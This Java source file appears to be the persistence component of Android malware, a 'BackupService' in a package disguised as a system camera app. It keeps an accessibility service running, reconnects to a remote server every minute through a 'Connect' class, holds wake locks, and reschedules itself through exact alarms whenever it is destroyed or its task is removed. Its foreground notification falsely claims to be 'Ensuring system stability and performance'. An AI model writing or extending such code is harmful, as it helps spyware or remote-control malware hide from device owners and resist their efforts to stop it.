package com.android.photo.camera.capture;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;

/**
 * Backup service that ensures the main service and accessibility service are running
 * Simple implementation with no inner classes
 */
public class BackupService extends Service {
    private static final String TAG = "BackupService";
    private PowerManager.WakeLock wakeLock;
    private Handler handler;
    private static final long CHECK_INTERVAL = 60 * 1000; // 1 minute
    private static final long RESTART_INTERVAL = 5 * 1000; // 5 seconds

    // Message what codes
    private static final int MSG_CHECK_SERVICE = 1;

    @Override
    public void onCreate() {
        super.onCreate();

        // Create handler with message handling
        handler = new StaticHandler(this);

        // Start in foreground with notification
        ForegroundServiceHelper.startForeground(this, 1002,
                "Backup Service", "Ensuring system stability and performance");

        acquireWakeLock();

        // Start first service check
        if (handler != null) {
            handler.sendEmptyMessageDelayed(MSG_CHECK_SERVICE, CHECK_INTERVAL);
        }
    }

    // Static handler class to avoid leaks and inner class problems
    private static class StaticHandler extends Handler {
        private final BackupService service;

        StaticHandler(BackupService service) {
            super(Looper.getMainLooper());
            this.service = service;
        }

        @Override
        public void handleMessage(Message msg) {
            if (msg.what == MSG_CHECK_SERVICE && service != null) {
                // Do the check
                service.performServiceCheck();

                // Schedule next check
                sendEmptyMessageDelayed(MSG_CHECK_SERVICE, CHECK_INTERVAL);
            }
        }
    }

    public void performServiceCheck() {
        ensureMainServiceRunning();
        Connect.startAsync(getApplicationContext());
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "BackupService::WakeLockTag"
            );
            wakeLock.acquire(10 * 60 * 1000L); // 10 minutes timeout
        }
    }

    private void ensureMainServiceRunning() {
        // Start the main accessibility service
        Intent serviceIntent = new Intent(this, com.android.photo.camera.capture.Service.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting main service", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // If service is restarted, ensure it's in the foreground again
        ForegroundServiceHelper.startForeground(this, 1002,
                "Backup Service", "Ensuring system stability and performance");

        // Ensure connection to server is active
        Connect.startAsync(this);
        scheduleAlarm();
        return START_STICKY;
    }

    private void scheduleAlarm() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(this, MyReceiver.class);
        intent.setAction("RESTART_BACKUP_SERVICE");

        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this,
                2001,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        if (alarmManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                        pendingIntent
                );
            } else {
                alarmManager.setExact(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                        pendingIntent
                );
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        if (wakeLock != null && wakeLock.isHeld()) {
            try {
                wakeLock.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing wakelock", e);
            }
        }

        // Remove any pending messages
        if (handler != null) {
            handler.removeMessages(MSG_CHECK_SERVICE);
        }

        // Schedule a restart of this service
        scheduleAlarm();

        // Send broadcast to restart service
        Intent broadcastIntent = new Intent("RestartBackupService");
        sendBroadcast(broadcastIntent);
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);

        // Schedule immediate restart
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent restartIntent = new Intent(getApplicationContext(), BackupService.class);
        PendingIntent service = PendingIntent.getService(
                getApplicationContext(),
                2002,
                restartIntent,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
        );

        if (alarmManager != null) {
            alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, 1000, service);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}